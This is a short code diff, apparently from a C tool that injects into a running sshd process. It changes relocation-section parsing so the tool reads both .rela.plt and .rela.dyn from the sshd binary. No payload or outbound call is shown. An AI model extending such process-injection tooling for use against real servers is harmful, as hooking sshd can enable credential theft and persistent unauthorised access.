@@ -87,7 +87,8 @@ void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
 	ctx->symtab_sz = get_section(sshd_path, ".symtab", &ctx->symtab, &ctx->symtab_base);
 	ctx->strtab_sz = get_section(sshd_path, ".strtab", &ctx->strtab, &ctx->strtab_base);
 	ctx->got_sz    = get_section(sshd_path, ".got",    &ctx->got,    &ctx->got_base);
-    ctx->rela_sz   = get_section(sshd_path, ".rela.plt",    &ctx->rela,    &ctx->rela_base);
+  ctx->rela_plt_sz   = get_section(sshd_path, ".rela.plt",    &ctx->rela_plt,    &ctx->rela_plt_base);
+  ctx->rela_dyn_sz   = get_section(sshd_path, ".rela.dyn",    &ctx->rela_dyn,    &ctx->rela_dyn_base);
 
 	// cache all call instructions in executable regions
 	cache_calltable(ctx);
